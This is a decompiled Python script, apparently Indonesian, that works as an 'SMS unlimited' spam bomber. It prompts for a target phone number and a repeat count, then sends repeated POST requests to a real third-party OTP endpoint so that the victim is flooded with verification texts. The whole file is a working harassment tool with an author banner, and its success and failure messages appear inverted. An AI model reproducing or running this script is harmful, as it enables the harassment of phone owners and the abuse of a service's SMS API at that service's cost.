# uncompyle6 version 3.7.3
# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Warning: this version of Python has problems handling the Python 3 "byte" type in constants properly.

# Embedded file name: sul.py
# Compiled at: 2020-08-19 08:04:20
# Size of source mod 2**32: 1565 bytes
import os, sys, json, requests
from time import sleep
m = '\x1b[1;31m'
h = '\x1b[1;32m'
k = '\x1b[1;33m'
b = '\x1b[1;36m'
p = '\x1b[1;37m'
u = '\x1b[1;35m'

def lagi():
    lag = input(f"{k}Mau Spam Lagi?{h}[y/n] : ")
    if lag == 'y':
        os.system('python sul.py')
    else:
        if lag == 'n':
            print(f"{h}Exiting...")
            sleep(3)
            sys.exit()


def wr(z):
    for i in z + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        sleep(0.008333333333333333)


ban = f" {b}____        _\n/ ___| _   _| |\n\\___ \\| | | | |\n{p} ___) | |_| | |\n|____/ \\__,_|_|{k} [Sms unlimited]\n{b}u'\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n'{b}u'\u2551 '{p}Author  {b}: {p}MRROBO28{b}u'                   \u2551\n'{b}u'\u2551 '{p}github  {b}: {p}https://github.con/MRROBO28{b}u'\u2551\n'{b}u'\u2551 '{p}Youtube {b}: {p}TEKTRIKBOT CN{b}u'              \u2551\n'{b}u'\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n'"
os.system('clear')
wr(ban)
print(f"{k}Ex : 088817xxx")
nom = input(f"{b}No {p}Target {h}> {p}")
jml = int(input(f"{p}Jum{p}lah {h}> {p}"))
head = {'Content-Type':'application/json', 
 'User-Agent':'okhttp/3.12.1'}
dat = json.dumps({'memberToken':'',  'receivers':nom})
url = 'https://phr.gms.digital/api/user/getOTP'
for x in range(jml):
    piz = requests.post(url, data=dat, headers=head).text
    if 'ok' in piz:
        print(f"{m}[!]{b}Send To {k}{nom}{m} [Gagal]")
    else:
        print(f"{k}[+]{b}Send To {k}{nom}{h} [Sucses]")

lagi()
# okay decompiling z.pyc
